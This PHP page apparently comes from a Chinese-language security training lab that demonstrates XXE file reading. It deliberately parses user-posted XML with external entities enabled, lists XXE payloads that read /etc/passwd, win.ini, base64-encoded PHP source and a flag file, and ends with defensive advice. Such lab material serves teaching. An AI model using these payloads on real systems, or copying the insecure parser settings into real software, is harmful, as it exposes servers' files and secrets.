<?php
// XXE文件读取漏洞
$module_name = '文件读取';
$module_icon = '📄';
$module_desc = '通过XXE漏洞读取服务器本地文件。';

// 漏洞代码
$result = '';
$error = '';

if (isset($_POST['xml'])) {
    $xml = $_POST['xml'];
    
    // 漏洞：使用simplexml_load_string解析XML，没有禁用外部实体
    try {
        // 确保启用外部实体解析（默认情况下可能被禁用）
        libxml_disable_entity_loader(false);
        
        // 使用DOMDocument解析XML，支持外部实体
        $dom = new DOMDocument();
        $dom->resolveExternals = true;
        $dom->substituteEntities = true;
        
        if ($dom->loadXML($xml)) {
            $root = $dom->documentElement;
            $name = $root->getElementsByTagName('name')->item(0);
            if ($name) {
                $result = 'XML解析成功：' . htmlspecialchars($name->nodeValue);
            } else {
                $result = 'XML解析成功，但未找到name元素';
            }
        } else {
            $error = 'XML解析失败';
        }
    } catch (Exception $e) {
        $error = '解析错误：' . $e->getMessage();
    }
}

// 页面内容
$content = '<div class="card">
        <div class="card-header">
            <h5 class="mb-0">📄 XXE文件读取</h5>
        </div>
        <div class="card-body">
            <div class="alert alert-danger">
                <strong>💡 漏洞说明：</strong><br>
                本场景演示XXE文件读取漏洞。<br>
                服务器使用simplexml_load_string解析XML，没有禁用外部实体，攻击者可以通过构造恶意XML读取服务器本地文件。
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>🔍 漏洞代码</h6>
                </div>
                <div class="card-body">
                    <pre class="bg-dark text-light p-3 rounded"><code>if (isset($_POST["xml"])) {
    $xml = $_POST["xml"];
    
    // 漏洞：使用simplexml_load_string解析XML，没有禁用外部实体
    $simplexml = simplexml_load_string($xml);
    if ($simplexml) {
        $result = "XML解析成功：" . print_r($simplexml, true);
    } else {
        $error = "XML解析失败";
    }
}
</code></pre>
                </div>
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>🎯 攻击演示</h6>
                </div>
                <div class="card-body">
                    <p class="mb-3">本场景演示XXE文件读取漏洞，尝试以下攻击：</p>

                    <h5 class="mb-2">1. 读取系统文件</h5>
                    <pre class="bg-dark text-light p-3 rounded"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;root&gt;
    &lt;name&gt;&amp;file;&lt;/name&gt;
&lt;/root&gt;</code></pre>

                    <h5 class="mb-2 mt-4">2. 读取Windows系统文件</h5>
                    <pre class="bg-dark text-light p-3 rounded"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY file SYSTEM "file:///c:/windows/win.ini"&gt;
]&gt;
&lt;root&gt;
    &lt;name&gt;&amp;file;&lt;/name&gt;
&lt;/root&gt;</code></pre>

                    <h5 class="mb-2 mt-4">3. 读取PHP文件（base64编码）</h5>
                    <pre class="bg-dark text-light p-3 rounded"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=01_file_read.php"&gt;
]&gt;
&lt;root&gt;
    &lt;name&gt;&amp;file;&lt;/name&gt;
&lt;/root&gt;</code></pre>

                    <h5 class="mb-2 mt-4">4. 读取Flag文件</h5>
                    <pre class="bg-dark text-light p-3 rounded"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY file SYSTEM "file:///d:/phpstudy_pro/WWW/zhaosec/xxe/flag.txt"&gt;
]&gt;
&lt;root&gt;
    &lt;name&gt;&amp;file;&lt;/name&gt;
&lt;/root&gt;</code></pre>
                </div>
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>💻 实际测试</h6>
                </div>
                <div class="card-body">
                    <form method="POST" class="mb-3">
                        <div class="mb-3">
                            <label for="xml" class="form-label">XML内容</label>
                            <textarea name="xml" id="xml" class="form-control" rows="8" placeholder="输入XML内容">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY file SYSTEM "file:///d:/phpstudy_pro/WWW/zhaosec/xxe/flag.txt"&gt;
]&gt;
&lt;root&gt;
    &lt;name&gt;&amp;file;&lt;/name&gt;
&lt;/root&gt;</textarea>
                        </div>
                        <button type="submit" class="btn btn-danger">提交</button>
                    </form>

                    ';

if ($error) {
    $content .= '<div class="alert alert-danger">
                        <strong>错误：</strong>
                        <p>' . htmlspecialchars($error) . '</p>
                    </div>';
}

if ($result) {
    $content .= '<div class="alert alert-secondary">
                        <strong>解析结果：</strong>
                        <pre class="mb-0 mt-2"><code>' . htmlspecialchars($result) . '</code></pre>
                    </div>';
}

$content .= '                </div>
            </div>

            <div class="card">
                <div class="card-header">
                    <h6>🛡️ 防御建议</h6>
                </div>
                <div class="card-body">
                    <ol>
                        <li><strong>禁用外部实体：</strong>在XML解析时禁用外部实体</li>
                        <li><strong>使用libxml_disable_entity_loader：</strong>在PHP中使用libxml_disable_entity_loader(true)</li>
                        <li><strong>使用XMLReader：</strong>使用更安全的XMLReader替代simplexml_load_string</li>
                        <li><strong>输入验证：</strong>对XML输入进行严格的验证</li>
                        <li><strong>使用CDATA：</strong>对于用户输入，使用CDATA包裹</li>
                        <li><strong>更新依赖：</strong>确保使用最新版本的XML解析库</li>
                    </ol>
                </div>
            </div>
        </div>
    </div>';

// 包含模板
include '../template/module_template.php';
?>